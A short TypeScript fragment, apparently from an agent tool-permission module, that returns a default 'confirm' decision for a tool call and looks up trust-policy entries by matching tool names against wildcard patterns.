    const hasDelegate = this.promptDelegate !== undefined;
    return {
      toolName: tool.name,
      subject,
      steps,
      winnerIndex,
      decision: {
        permission: 'confirm',
        source: 'default',
        ...(hasDelegate ? { reason: 'would prompt user via delegate' } : {}),
      },
    };
  }

  private findNamespaceEntry(toolName: string): TrustPolicy[string] | undefined {
    // Use pre-compiled wildcard entries — O(k) where k = wildcard count
    for (const { pattern, value } of this.wildcardEntries) {
      if (matchGlob(pattern, toolName)) return value;
    }
    return undefined;
  }
}
